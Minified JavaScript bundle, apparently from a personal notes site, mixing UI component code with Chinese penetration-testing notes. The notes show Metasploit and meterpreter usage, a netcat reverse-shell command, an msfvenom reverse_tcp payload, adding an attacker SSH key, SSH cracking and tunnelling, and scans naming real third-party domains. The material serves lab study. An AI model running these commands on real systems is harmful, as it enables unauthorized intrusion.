gu,Du=du.option,Ou=du.value;return(gu=Du==null?void 0:Du[Q.label])!==null&&gu!==void 0?gu:Ou}),Eu.map(function(du){var gu=du.option;return gu}));return{label:mu,value:d(ru),valueCells:ru}})},[L,X,Q,cu,Z])};function $(L){var X=n.useRef();X.current=L;var Q=n.useCallback(function(){return X.current.apply(X,arguments)},[]);return Q}var au=f("815F"),uu=function(L,X){var Q=n.useRef({options:null,info:null}),Z=n.useCallback(function(){return Q.current.options!==L&&(Q.current.options=L,Q.current.info=Object(au.a)(L,{fieldNames:X,initWrapper:function(lu){return Object(b.a)(Object(b.a)({},lu),{},{pathKeyEntities:{}})},processEntity:function(lu,ru){var Eu=lu.nodes.map(function(mu){return mu[X.value]}).join(D);ru.pathKeyEntities[Eu]=lu,lu.key=Eu}})),Q.current.info.pathKeyEntities},[X,L]);return Z},eu=f("Kwbf");function iu(L){return n.useMemo(function(){if(!L)return[!1,{}];var X={matchInputWidth:!0,limit:50};return L&&Object(l.a)(L)==="object"&&(X=Object(b.a)(Object(b.a)({},X),L)),X.limit<=0&&delete X.limit,[!0,X]},[L])}var hu=function(L,X){return n.useCallback(function(Q){var Z=[],cu=[];return Q.forEach(function(lu){var ru=B(lu,L,X);ru.every(function(Eu){return Eu.option})?cu.push(lu):Z.push(lu)}),[cu,Z]},[L,X])},Ru=["id","prefixCls","fieldNames","defaultValue","value","changeOnSelect","onChange","displayRender","checkable","searchValue","onSearch","showSearch","expandTrigger","options","dropdownPrefixCls","loadData","popupVisible","open","popupClassName","dropdownClassName","dropdownMenuColumnStyle","popupPlacement","placement","onDropdownVisibleChange","onPopupVisibleChange","expandIcon","loadingIcon","children","dropdownMatchSelectWidth"];function un(L){return Array.isArray(L)&&Array.isArray(L[0])}function fn(L){return L?un(L)?L:L.length===0?[]:[L]:[]}var nn=n.forwardRef(function(L,X){var Q=L.id,Z=L.prefixCls,cu=Z===void 0?"rc-cascader":Z,lu=L.fieldNames,ru=L.defaultValue,Eu=L.value,mu=L.changeOnSelect,du=L.onChange,gu=L.displayRender,Du=L.checkable,Ou=L.searchValue,Tu=L.onSearch,tu=L.showSearch,su=L.expandTrigger,ku=L.options,pu=L.dropdownPrefixCls,$u=L.loadData,vu=L.popupVisible,qu=L.open,Mu=L.popupClassName,_u=L.dropdownClassName,xu=L.dropdownMenuColumnStyle,Cu=L.popupPlacement,zu=L.placement,Lu=L.onDropdownVisibleChange,Xu=L.onPopupVisibleChange,Ju=L.expandIcon,Nu=Ju===void 0?">":Ju,Yu=L.loadingIcon,on=L.children,ou=L.dropdownMatchSelectWidth,Wu=ou===void 0?!1:ou,Iu=Object(m.a)(L,Ru),jn=Object(F.a)(Q),Su=!!Du,An=Object(o.a)(ru,{value:Eu,postState:fn}),gn=Object(s.a)(An,2),rn=gn[0],Pn=gn[1],an=n.useMemo(function(){return C(lu)},[JSON.stringify(lu)]),Bn=n.useMemo(function(){return ku||[]},[ku]),Dn=uu(Bn,an),Qu=n.useCallback(function(kn){var Uu=Dn();return kn.map(function(En){var ln=Uu[En].nodes;return ln.map(function(bn){return bn[an.value]})})},[Dn,an]),wn=Object(o.a)("",{value:Ou,postState:function(Uu){return Uu||""}}),nj=Object(s.a)(wn,2),Tn=nj[0],Vn=nj[1],Fn=function(Uu,En){Vn(Uu),En.source!=="blur"&&Tu&&Tu(Uu)},Hu=iu(tu),en=Object(s.a)(Hu,2),Zu=en[0],pn=en[1],xn=N(Tn,Bn,an,pu||cu,pn,mu),Ln=hu(Bn,an),Gn=n.useMemo(function(){var kn=Ln(rn),Uu=Object(s.a)(kn,2),En=Uu[0],ln=Uu[1];if(!Su||!rn.length)return[En,[],ln];var bn=A(En),$n=Dn(),Rn=Object(k.a)(bn,!0,$n),_n=Rn.checkedKeys,Hn=Rn.halfCheckedKeys;return[Qu(_n),Qu(Hn),ln]},[Su,rn,Dn,Qu,Ln]),hn=Object(s.a)(Gn,3),dn=hn[0],Yn=hn[1],Wn=hn[2],dj=n.useMemo(function(){var kn=A(dn),Uu=O(kn,Dn);return[].concat(Object(j.a)(Wn),Object(j.a)(Qu(Uu)))},[dn,Dn,Qu,Wn]),Zn=ju(dj,Bn,an,Su,gu),Qn=$(function(kn){if(Pn(kn),du){var Uu=fn(kn),En=Uu.map(function($n){return B($n,Bn,an).map(function(Rn){return Rn.option})}),ln=Su?Uu:Uu[0],bn=Su?En:En[0];du(ln,bn)}}),sj=$(function(kn){if(Vn(""),!Su)Qn(kn);else{var Uu=d(kn),En=A(dn),ln=A(Yn),bn=En.includes(Uu),$n=Wn.some(function(Un){return d(Un)===Uu}),Rn=dn,_n=Wn;if($n&&!bn)_n=Wn.filter(function(Un){return d(Un)!==Uu});else{var Hn=bn?En.filter(function(Un){return Un!==Uu}):[].concat(Object(j.a)(En),[Uu]),tj=Dn(),gj;if(bn){var pj=Object(k.a)(Hn,{checked:!1,halfCheckedKeys:ln},tj);gj=pj.checkedKeys}else{var hj=Object(k.a)(Hn,!0,tj);gj=hj.checkedKeys}var cj=O(gj,Dn);Rn=Qu(cj)}Qn([].concat(Object(j.a)(_n),Object(j.a)(Rn)))}}),Fj=function(Uu,En){if(En.type==="clear"){Qn([]);return}var ln=En.values[0].valueCells;sj(ln)},kj=qu!==void 0?qu:vu,Cj=_u||Mu,Pj=zu||Cu,oj=function(Uu){Lu==null||Lu(Uu),Xu==null||Xu(Uu)},Ej=n.useMemo(function(){return{options:Bn,fieldNames:an,values:dn,halfValues:Yn,changeOnSelect:mu,onSelect:sj,checkable:Du,searchOptions:xn,dropdownPrefixCls:pu,loadData:$u,expandTrigger:su,expandIcon:Nu,loadingIcon:Yu,dropdownMenuColumnStyle:xu}},[Bn,an,dn,Yn,mu,sj,Du,xn,pu,$u,su,Nu,Yu,xu]),Bj=!(Tn?xn:Bn).length,fj=Tn&&pn.matchInputWidth||Bj?{}:{minWidth:"auto"};return n.createElement(v.Provider,{value:Ej},n.createElement(c.a,Object(R.a)({},Iu,{ref:X,id:jn,prefixCls:cu,dropdownMatchSelectWidth:Wu,dropdownStyle:fj,displayValues:Zn,onDisplayValuesChange:Fj,mode:Su?"multiple":void 0,searchValue:Tn,onSearch:Fn,showSearch:Zu,OptionList:G,emptyOptions:Bj,open:kj,dropdownClassName:Cj,placement:Pj,onDropdownVisibleChange:oj,getRawInputElement:function(){return on}})))}),Ku=nn,Bu=Ku,Au=f("bT9E"),wu=f("UESt"),yu=f("ye1Q"),Gu=f("5bA4"),tn=f("H84U"),vn=f("3Nzz"),On=f("1vzs"),zn=f("EXcs"),Sn=function(L,X){var Q={};for(var Z in L)Object.prototype.hasOwnProperty.call(L,Z)&&X.indexOf(Z)<0&&(Q[Z]=L[Z]);if(L!=null&&typeof Object.getOwnPropertySymbols=="function")for(var cu=0,Z=Object.getOwnPropertySymbols(L);cu<Z.length;cu++)X.indexOf(Z[cu])<0&&Object.prototype.propertyIsEnumerable.call(L,Z[cu])&&(Q[Z[cu]]=L[Z[cu]]);return Q};function qn(L,X,Q){var Z=L.toLowerCase().split(X).reduce(function(ru,Eu,mu){return mu===0?[Eu]:[].concat(Object(j.a)(ru),[X,Eu])},[]),cu=[],lu=0;return Z.forEach(function(ru,Eu){var mu=lu+ru.length,du=L.slice(lu,mu);lu=mu,Eu%2==1&&(du=n.createElement("span",{className:"".concat(Q,"-menu-item-keyword"),key:"seperator-".concat(Eu)},du)),cu.push(du)}),cu}var cn=function(X,Q,Z,cu){var lu=[],ru=X.toLowerCase();return Q.forEach(function(Eu,mu){mu!==0&&lu.push(" / ");var du=Eu[cu.label],gu=Object(l.a)(du);(gu==="string"||gu==="number")&&(du=qn(String(du),ru,Z)),lu.push(du)}),lu},In=n.forwardRef(function(L,X){var Q,Z=L.prefixCls,cu=L.size,lu=L.className,ru=L.multiple,Eu=L.bordered,mu=Eu===void 0?!0:Eu,du=L.transitionName,gu=L.choiceTransitionName,Du=gu===void 0?"":gu,Ou=L.popupClassName,Tu=L.dropdownClassName,tu=L.expandIcon,su=L.showSearch,ku=L.allowClear,pu=ku===void 0?!0:ku,$u=L.notFoundContent,vu=L.direction,qu=L.getPopupContainer,Mu=Sn(L,["prefixCls","size","className","multiple","bordered","transitionName","choiceTransitionName","popupClassName","dropdownClassName","expandIcon","showSearch","allowClear","notFoundContent","direction","getPopupContainer"]),_u=Object(Au.a)(Mu,["suffixIcon"]),xu=n.useContext(tn.b),Cu=xu.getPopupContainer,zu=xu.getPrefixCls,Lu=xu.renderEmpty,Xu=xu.direction,Ju=vu||Xu,Nu=Ju==="rtl",Yu=$u||Lu("Cascader"),on=zu(),ou=zu("select",Z),Wu=zu("cascader",Z),Iu=t()(Tu||Ou,"".concat(Wu,"-dropdown"),Object(h.a)({},"".concat(Wu,"-dropdown-rtl"),Ju==="rtl")),jn=n.useMemo(function(){if(!su)return su;var wn={render:cn};return Object(l.a)(su)==="object"&&(wn=Object(R.a)(Object(R.a)({},wn),su)),wn},[su]),Su=n.useContext(vn.b),An=cu||Su,gn=tu;tu||(gn=Nu?n.createElement(Gu.a,null):n.createElement(wu.a,null));var rn=n.createElement("span",{className:"".concat(ou,"-menu-item-loading-icon")},n.createElement(yu.a,{spin:!0})),Pn=n.useMemo(function(){return ru?n.createElement("span",{className:"".concat(Wu,"-checkbox-inner")}):!1},[ru]),an=Object(On.a)(Object(R.a)(Object(R.a)({},L),{multiple:ru,prefixCls:ou})),Bn=an.suffixIcon,Dn=an.removeIcon,Qu=an.clearIcon;return n.createElement(Bu,Object(R.a)({prefixCls:ou,className:t()(!Z&&Wu,(Q={},Object(h.a)(Q,"".concat(ou,"-lg"),An==="large"),Object(h.a)(Q,"".concat(ou,"-sm"),An==="small"),Object(h.a)(Q,"".concat(ou,"-rtl"),Nu),Object(h.a)(Q,"".concat(ou,"-borderless"),!mu),Q),lu)},_u,{direction:Ju,notFoundContent:Yu,allowClear:pu,showSearch:jn,expandIcon:gn,inputIcon:Bn,removeIcon:Dn,clearIcon:Qu,loadingIcon:rn,checkable:Pn,dropdownClassName:Iu,dropdownPrefixCls:Z||Wu,choiceTransitionName:Object(zn.b)(on,"",Du),transitionName:Object(zn.b)(on,"slide-up",du),getPopupContainer:qu||Cu,ref:X}))});In.displayName="Cascader";var Jn=U.a=In},EkZe:function(nu,U,f){"use strict";f.d(U,"a",function(){return j});var R=f("q1tI"),h=f.n(R),l=f("/qoP"),j={name:"\u3010MetaSploit\u3011 / \u3010MsfConsole\u3011 / \u3010msf\u3011     (\u57FA\u4E8E\u3010ExploitDB\u3011)",desc:h.a.createElement(h.a.Fragment,null,"\uFF08\u53D1\u73B0\u76EE\u6807\u57DF\u540D\u5185\uFF0C\u5177\u6709\u7269\u7406MAC\u5730\u5740\u7684\uFF0C\u542F\u7528\u4E86IPv6\u7684\u8BA1\u7B97\u673A\uFF09"),steps:[{name:"\u57FA\u672C\u4F7F\u7528",desc:h.a.createElement(h.a.Fragment,null),content:h.a.createElement(h.a.Fragment,null,l.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              metasploit / msfconsole / msf \uFF08\u53D1\u73B0\u76EE\u6807\u57DF\u540D\u5185\uFF0C\u5177\u6709\u7269\u7406MAC\u5730\u5740\u7684\uFF0C\u542F\u7528\u4E86IPv6\u7684\u8BA1\u7B97\u673A\uFF09

              \u8FDB\u884C\u66F4\u65B0
                  msfupdate

              \u3010msfconsole\u3011\u8F6F\u4EF6
                  \u8FDB\u5165\u754C\u9762\u3002
                      \u9ED8\u8BA4\u60C5\u51B5\u4E0B\uFF0C\u4EE5\u3010msf6 >\u3011\u5F00\u5934\u3002
                      \u3010back\u3011\uFF0C\u56DE\u5230\u4E0A\u4E00\u7EA7\u3010\u83DC\u5355\u3011\u3002
                  \u6A21\u5757\uFF1A
                      \u3010search <\u5173\u952E\u5B57>\u3011\uFF0C\u67E5\u627E\u6A21\u5757
                          1.\u5148\u67E5\u627E\u3010\u670D\u52A1\u540D\u3011
                              1.\u5982\u3010Samba\u3011
                          2.\u7136\u540E\u518D\u67E5\u627E\u3010\u5177\u4F53\u7248\u672C\u3011
                              1.\u5982\u30103.0.20\u3011
                          3.\u5982\u679C\u8FD8\u627E\u4E0D\u5230\uFF0C\u5219\u53EF\u4EE5Google\u641C\u7D22
                              1.\u5982\u3010samba 3.0.20 exploit\u3011\uFF0C\u540E\u9762\u5E26 exploit \u4EE3\u8868\u9ED1\u5BA2\u653B\u51FB\u3002
                                  1.\u4E5F\u53EF\u4EE5\u4F7F\u7528\u3010Vulnerability\u3011\u4E3A\u5173\u952E\u5B57
                          4.\u6709\u4E2A\u975E\u5E38\u5B9E\u7528\u7684\uFF0Cexploit\u6F0F\u6D1E\u5229\u7528\uFF0C\u6536\u5F55\u7F51\u7AD9
                              CVE security vulnerability database.        https://www.cvedetails.com/
                                  1.\u3010\u641C\u7D22\u670D\u52A1\u3011\u2014\u2014\u3010\u9009\u62E9Products\u3011\u2014\u2014\u3010\u9009\u62E9Browse all versions\u3011\u2014\u2014\u3010\u67E5\u770B\u5BF9\u5E94\u7248\u672C \u7684\u6240\u6709Vulnerability\u3011
                                  2.\u67E5\u770B\u662F\u5426\u6709\u53EF\u7528 msf \u811A\u672C\uFF1A
                                      1.\u5728\u3010Metasploit Modules Related To\u3011\u4E00\u680F\uFF0C\u5DF2\u7ECF\u5168\u90E8\u5217\u51FA\u4E86\u3002

                      \u3010use auxiliary/scanner/discovery/ipv6_multicast_ping\u3011\uFF0C\u9009\u62E9\u6A21\u5757

                      \u3010show options\u3011 \u67E5\u770B\u9009\u9879

                  set \u8BBE\u7F6E\u3010\u5168\u5C40\u53C2\u6570\u3011
                      1.\u548C\u3010\u6A21\u5757\u53C2\u6570\u3011\u7684\u65B9\u6CD5\u7C7B\u4F3C\uFF1B\u53EA\u662F\u4F5C\u7528\u4E8E \u6240\u6709\u6A21\u5757 \u3002
                      2.\u5E38\u7528\u9879
                          1.\u3010RHOSTS\u3011\uFF0C\u8FDC\u7A0B\u673AIP
                          2.\u3010LHOST\u3011\uFF0C\u672C\u5730\u673AIP
                          3.\u3010LPORT\u3011\uFF0C\u672C\u5730\u673A\u7AEF\u53E3

                  set \u8BBE\u7F6E\u3010\u6A21\u5757\u53C2\u6570\u3011
                      \u5FC5\u9009\u53C2\u6570\uFF1Arhosts\uFF0C\u53EF\u4EE5\u9009\u62E9 IP\u3001\u57DF\u540D
                          \u3010192.168.2.103\u3011\u3001\u3010192.168.81.1\u3011\u3001\u3010192.168.219.129\u3011
                          \u3010zhihu.com\u3011\u3001\u3010www.boe.ttct.edu.tw\u3011
                      \u53EF\u9009\u53C2\u6570\uFF1Ainterface\uFF0C\u6307\u5B9A\u7279\u5B9A\u7684\u3010\u7F51\u7EDC\u8BBE\u5907\u63A5\u53E3\u3011\u540D
                          \u3010\u81EA\u5DF1\u8BBE\u7F6E\u7684Wifi\u3011\u3001\u3010eth0\u3011\u3001\u3010lo\u3011

                  \u9009\u62E9payload
                      \u3010show payloads\u3011\uFF0C\u67E5\u770B\u53EF\u7528\u7684payload
                      \u3010set payload <\u540D\u79F0>\u3011\uFF0C\u4F7F\u7528\u67D0\u4E2Apayload
                          1.\u5FC5\u987B\u6CE8\u610F\uFF1A\u6709\u4E9B\u3010payload\u3011\u9700\u8981\u8BBE\u7F6E\u53C2\u6570\u3002
                              1.\u540C\u6837\u662F\u7528\u3010set \u8BBE\u7F6E\u53C2\u6570\u3011\u3002

                  run \u8FD0\u884C\u811A\u672C

              \u5E38\u89C1\u6307\u4EE4\uFF1A

                  check
                      \u63A2\u6D4B\u3010\u5F53\u524D\u811A\u672C\u3011\u5BF9\u5E94\u7684\u6F0F\u6D1E\uFF0C\u662F\u5426\u5728\u3010\u76EE\u6807\u673A\u5668\u3011\u4E0A\u5B58\u5728

              \u5E38\u89C1\u5B50\u6A21\u5757\uFF1A

                  \u3010multi/script/web_delivery\u3011
                      \u7528\u4E8E\u4E00\u4E9B \u3010Web\u4FE1\u606F\u3011 \u63A2\u6D4B\u3002


              `))},{name:"\u3010meterpreter\u3011\u7EC8\u7AEF",desc:h.a.createElement(h.a.Fragment,null),content:h.a.createElement(h.a.Fragment,null,l.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              \u53C2\u8003\u8D44\u6599\uFF1A
                  https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

              meterpreter\u7EC8\u7AEF\uFF1A
                  1.\u9ED8\u8BA4\u60C5\u51B5\u4E0B\uFF0C\u4EE5\u3010meterpreter >\u3011\u5F00\u5934\u3002
                  2.\u5E38\u89C1\u6307\u4EE4\uFF1A
                      1.\u4ECE\u3010\u666E\u901Ashell\u3011\uFF0C\u8F6C\u6362\u4E3A\u3010meterpreter\u7EC8\u7AEF\u3011
                          1.\u89C1\u3010\u6211\u7684\u7B14\u8BB0\u3011
                      2.\u4ECE\u3010meterpreter\u7EC8\u7AEF\u3011\uFF0C\u8F6C\u6362\u4E3A\u3010\u666E\u901Ashell\u3011
                          1.\u6267\u884C\u3010shell\u3011\u547D\u4EE4\u3002
                      3.\u3010execute\u3011\uFF0C\u6267\u884C\u6587\u4EF6
                          1.\u3010execute -f nc.exe -a "-e cmd.exe 10.10.14.20 1234"\u3011
                              \u3010-f\u3011\uFF0C\u6307\u5B9A\u6587\u4EF6
                              \u3010-a\u3011\uFF0C\u4F20\u5165arguments
                      4.\u3010sysinfo\u3011\uFF0C\u67E5\u770B\u76EE\u6807\u7CFB\u7EDF\u7684\u57FA\u672C\u4FE1\u606F\u3001\u7248\u672C\u53F7\u3002
                      5.\u4E0A\u4F20\u4E0B\u8F7D\uFF1A
                          1.\u3010download <\u76EE\u6807\u6587\u4EF6> <\u672C\u5730\u76F8\u5BF9\u5B58\u653E\u8DEF\u5F84>\u3011
                              1.\u6B64\u5904\uFF0C\u5EFA\u8BAE\u5148\u3010lcd\u3011\u79FB\u52A8\u4E4B\u540E\uFF0C\u518D\u8FDB\u884C\u4E0B\u8F7D\u3002\u56E0\u4E3A\u3010meterpreter\u7EC8\u7AEF\u3011\u4E00\u822C\u65E0\u6CD5\u6B63\u786E\u8BC6\u522B\u3010~\u3011\u5B57\u7B26\u3002
                          2.\u3010upload <\u76EE\u6807\u6587\u4EF6> <\u8FDC\u7A0B\u8FDC\u7A0B\u8DEF\u5F84>\u3011
                      6.\u64CD\u4F5C\u672C\u5730\u653B\u51FB\u673A\u5668\uFF1A
                          1.\u3010lcd\u3011\uFF0C\u672C\u5730\u7684cd
                          2.\u3010lls\u3011\uFF0C\u672C\u5730\u7684ls

              \u6210\u529F\u4F8B\u5B50\uFF1A
                  \u53C2\u6570\u4EC5\u3010www.boe.ttct.edu.tw\u3011\u57DF\u540D\uFF0C\u8FDB\u884C\u7684\u68C0\u67E5\u3002\uFF08\u67E5\u51FA\u4E86\u30102001:288:9200::10\u3011 \uFF09



                `,`

                \u5E38\u89C1\u547D\u4EE4\uFF1A
                    search  -f  <\u6587\u4EF6\u540D\u79F0>
                        \u6709\u65F6\u5019\uFF0C\u53EF\u4EE5\u5FEB\u901F\u627E\u5230\uFF0C\u67D0\u4E00\u540D\u79F0\u6587\u4EF6

                `))},{name:"\u3010msfvenom\u3011    \uFF08 \u524D\u8EAB\u662F\u3010MsfPayload\u3011\u548C\u3010MsfEncode\u3011 \uFF09",desc:h.a.createElement(h.a.Fragment,null),content:h.a.createElement(h.a.Fragment,null,l.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
                      \u4ECB\u7ECD\uFF1A
                          \u662F\u4E00\u4E2A\u72EC\u7ACB\u7684\u6709\u6548\u8F7D\u8377\u751F\u6210\u5668\u3002


                      \u4F7F\u7528\uFF1A
                          \u7B2C\u4E00\u79CD\uFF1A
                              msfvenom -p  windows/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f exe > writeup.exe

                          \u7B2C\u4E8C\u79CD\uFF1A
                              \u89C1\u3010Tomcat\u3011\u7684\u3010war\u5305\u4E0A\u4F20\u3011\uFF1F\uFF1F\uFF1F

                      `))}]}},FOD2:function(nu,U,f){"use strict";f.d(U,"b",function(){return u}),f.d(U,"a",function(){return s});var R=f("q1tI"),h=f.n(R),l=f("/qoP"),j=f("ysNt"),n=j.e.singleATag_blank,u={name:"\u3010ssh2john\u3011\uFF0C\u5BF9SSH\u5BC6\u94A5\u8F6C\u6362\u4E3A\u3010John The Ripper\u3011\u683C\u5F0F",desc:h.a.createElement(h.a.Fragment,null),content:h.a.createElement(h.a.Fragment,null,l.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

      ssh2john
          \u6240\u5904\u4F4D\u7F6E\uFF1A\u3010/usr/share/john/ssh2john.py\u3011\u3002
          \u3010/usr/share/john/ssh2john.py key > hash\u3011

          \u5C06\u5BC6\u94A5\u8F6C\u6362\u4E3A john the ripper \u53EF\u4EE5\u7406\u89E3\u548C\u7834\u89E3\u5BC6\u7801\u7684\u683C\u5F0F

      `))},t={name:"\u3010SSH\u3011_\u3010Telnet\u3011_\u624B\u518C",steps:[{name:"\u3010SSH\u3011",desc:h.a.createElement(h.a.Fragment,null),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:h.a.createElement(h.a.Fragment,null),content:h.a.createElement(h.a.Fragment,null,l.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u8FD0\u884C
              ssh  <\u7528\u6237\u540D>@<IP\u5730\u5740>

              ssh  -i  <\u5BC6\u94A5\u6587\u4EF6>  <\u7528\u6237\u540D>@<IP\u5730\u5740>


          \u624B\u52A8\u6DFB\u52A0\u3010SSH\u516C\u94A5\u3011

              echo  "ssh-rsa  <\u5177\u4F53\u516C\u94A5\u503C>"  >>  /home/joanna/.ssh/authorized_keys
                  \u4F5C\u7528\uFF1A\u5F80\u5F80\u80FD\u591F\uFF0C\u6DFB\u52A0\u3010\u653B\u51FB\u8005\u516C\u94A5\u3011\uFF1B\u6765\u5B9E\u73B0\u6B3A\u9A97\u767B\u5F55


          \u5E38\u89C1\u9009\u9879
              \u3010-L  <\u672C\u5730\u7AEF\u53E3>:<\u8FDC\u7A0BIP>:<\u8FDC\u7A0B\u7AEF\u53E3>\u3011
                  \u8FDB\u884C\u7ED1\u5B9A\uFF0C\u5C06\u672C\u5730\uFF08\u5BA2\u6237\u7AEF\uFF09\u4E3B\u673A\u4E0A\u7684\u6307\u5B9A\u7AEF\u53E3\u8F6C\u53D1\u5230\u6307\u5B9A\u4E3B\u673A\uFF0C\u5E76\u4E14\u8FDC\u7A0B\u7AEF\u7684\u7AEF\u53E3\u3002
                      \u7B80\u5355\u6765\u8BF4\uFF0C\u5C31\u662F\u901A\u8FC7\u3010\u672C\u5730\u7AEF\u53E3\u3011 \u8BBF\u95EE\u3010\u8FDC\u7A0B\u4E3B\u673A\u3011\u7684\u3010\u5BF9\u5E94\u7AEF\u53E3\u3011\u3002
                          \u672C\u8D28\u4E0A\uFF1A\u5C31\u662F\u7AEF\u53E3\u6620\u5C04\u3002

                      \u4F5C\u7528\u573A\u666F\uFF1A
                          \u901A\u8FC7SSH\u8BBF\u95EE\u5185\u7F51\uFF0C\u7136\u540E\u5185\u7F51\u91CC\u9762\u7684\u3010\u4E13\u6709\u7F51\u7EDC\u3011\u9700\u8981\u66B4\u9732

              \u3010-R\u3011
                  \u53CD\u5411\uFF0Cforward
                  \u7C7B\u4F3C\u4E8E \u7AEF\u53E3\u6620\u5C04 \u4E4B\u7C7B\u7684\u3002
                  \u4E3E\u4F8B\uFF1A
                      \u3010ssh  -R  1337:127.0.0.1:52946  root@10.10.14.2\u3011
                          \u521B\u5EFA\u8FDC\u7A0BSSH\u96A7\u9053\uFF0C\u8BE5\u96A7\u9053\u5C06\u4ECE\u7AEF\u53E3\u8F6C\u53D1\u6240\u6709\u8FDE\u63A5\u3002\u6211\u4EEC\u4E3B\u673A\u7684\u30101337\u3011\uFF0C\u5C06\u8F6C\u53D1\u5230\u3010\u76EE\u6807\u76D2\u5B50\u3011\u7684\u7AEF\u53E352946\u3002

              \u3010-f\u3011
                  \uFF1F\uFF1F\uFF1F

              \u3010-N\u3011
                  \uFF1F\uFF1F\uFF1F


          `))},u]},{name:"\u3010Telnet\u3011",desc:h.a.createElement(h.a.Fragment,null),content:h.a.createElement(h.a.Fragment,null,l.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                  \u4ECB\u7ECD\uFF1A
                      \u662F\u7C7B\u4F3C\u4E8E\u300Assh\u300B\u7684\u8FDC\u7A0B\u7EC8\u7AEF\u5DE5\u5177\u3002

                  \u4F7F\u7528\u65B9\u5F0F\uFF1A
                      \u7C7B\u4F3C\u4E8E\u300Assh\u300B\u3002

                  \u76F8\u5173\u5229\u7528\u65B9\u5F0F\uFF1A
                      \u4E00\uFF1A\u7206\u7834\u5BC6\u7801    \u5982 admin/123456
                      \u4E8C\uFF1AXXXX

                  `))}]},s=t},FdYU:function(nu,U,f){"use strict";f.r(U);var R=f("PlTX");U.default=R.a},HJBr:function(nu,U,f){"use strict";f.d(U,"f",function(){return o}),f.d(U,"e",function(){return e}),f.d(U,"d",function(){return v}),f.d(U,"a",function(){return d}),f.d(U,"b",function(){return A}),f.d(U,"c",function(){return E});var R=f("Pv/L"),h=f("oBTY"),l=f("q1tI"),j=f.n(l),n=f("bxSD"),u=f("ysNt"),t=f("AfFY"),s=[0,0+1,0+1+3,0+1+3+9,0+1+3+9+27];function m(C,y){var _=y-1,O=y+1-1;return C.slice(s[_],s[O])}function F(C){return C.map(function(y){if(u.e.check_isString(y))return y;var _=y,O=k(_);return O})}function k(C){var y=C,_=y[0]||"--",O=y.slice(1),B=m(O,1),r=m(O,2),P=m(O,3),p=m(O,4);return{name:_,sub:{lv1:F(B),lv2:F(r),lv3:F(P),lv4:F(p)}}}var o=function(y){var _=y.strings,O=y.size,B=O===void 0?"medium":O,r=y.isMobile,P=r===void 0?!1:r,p=["--"].concat(Object(h.a)(_)),z=k(p).sub,N=z.lv1,K=z.lv2,S=z.lv3,T=z.lv4;if(console.log(N,K,S,T),P){let q=function(G){if(u.e.check_isString(G)){var ju=G;return j.a.createElement(j.a.Fragment,null,j.a.createElement("li",null,ju))}else{var $=G,au=Object(R.a)($),uu=au[0],eu=au.slice(1);return j.a.createElement(j.a.Fragment,null,j.a.createElement("li",null,uu),j.a.createElement("ol",null,eu.map(function(iu){return j.a.createElement(j.a.Fragment,null,j.a.createElement("li",null,q(iu)))})))}};var H="ol";switch(H){case"ol":return j.a.createElement("ol",null,_.map(function(G){return q(G)}));case"\u666E\u901A\u6587\u672C":return j.a.createElement("ol",null,_.flat(21).map(function(G){return j.a.createElement("li",null,G)}))}}else return j.a.createElement(j.a.Fragment,null,j.a.createElement(n.a,{cfg:{lv1:N,lv2:K,lv3:S,lv4:T!=null?T:[]},size:B}))},c=["\u67E5\u627E\u4E2D\u95F4\u4EF6","\u67E5\u627E\u4E2D\u95F4\u4EF6\u7248\u672C\u3001\u67E5\u627ECVE",["\u6587\u4EF6\u67E5\u627E","\u8FDB\u884C\u76EE\u5F55\u679A\u4E3E","\u6574\u7406\u9690\u79C1\u6587\u4EF6","\u6CE8\u610F\u4E00\u4E9B\u3010\u91CD\u8981\u4E8C\u8FDB\u5236\u6587\u4EF6\u3011",["123","456","789","10-11-12",["aaa","bbb","ccc","ddd","eee",["\u6807\u98981","\u5185\u5BB91","\u5185\u5BB92","\u5185\u5BB93","\u5185\u5BB94"]]]],"123"],b=["\u67E5\u627E\u4E2D\u95F4\u4EF6","\u67E5\u627E\u4E2D\u95F4\u4EF6\u7248\u672C\u3001\u67E5\u627ECVE","\u4E2D\u95F4\u4EF6\uFF0C\u5982\u679C\u6709\u767B\u5F55\u53E3\uFF0C\u53EF\u4EE5\u67E5\u627E\u9ED8\u8BA4\u5BC6\u7801","\u8FDB\u884C\u76EE\u5F55\u679A\u4E3E","\u6574\u7406\u9690\u79C1\u6587\u4EF6","\u6CE8\u610F\u4E00\u4E9B\u3010\u91CD\u8981\u4E8C\u8FDB\u5236\u6587\u4EF6\u3011",["\u5F31\u53E3\u4EE4\uFF0C\u4ECE\u6CA1\u6709\u4E00\u4E2A\u65F6\u4EE3\uFF0C\u50CF\u73B0\u5728","1"],["\u4EE5\u3010\u53EF\u53E0\u52A0\u3011\u65B9\u5F0F\u6536\u96C6\u6700\u65B0\u7684\u6F0F\u6D1E\u4FE1\u606F","HackerOne","i.hacking8.com"]],e=j.a.createElement(j.a.Fragment,null,j.a.createElement("h1",null,"\u901A\u7528\u8868\u2014\u2014\u770B\u4E0D\u5230\u4FE1\u606F\u2014\u2014\u9700\u8981\u76F2\u8BD5"),j.a.createElement("h2",null,"\uFF08\u91CD\u8981\u6027\u6392\u5E8F\uFF09"),j.a.createElement(o,{strings:b,size:"mini"})),v=j.a.createElement(j.a.Fragment,null,j.a.createElement("h1",null,"\u9776\u673A\u600E\u4E48\u6253"),j.a.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),j.a.createElement(o,{strings:["\u5916\u90E8\u4FE1\u606F\u6536\u96C6\uFF08\u975E\u5FC5\u8981\uFF09",["Enumeration/\u679A\u4E3E","\u8D44\u4EA7\u626B\u63CF"],"Identification / \uFF1F\uFF1F\uFF1F","Exploit / Exp\u5229\u7528","Foothold/\u5229\u7528\u70B9\u67E5\u627E","Post-Exploitation / 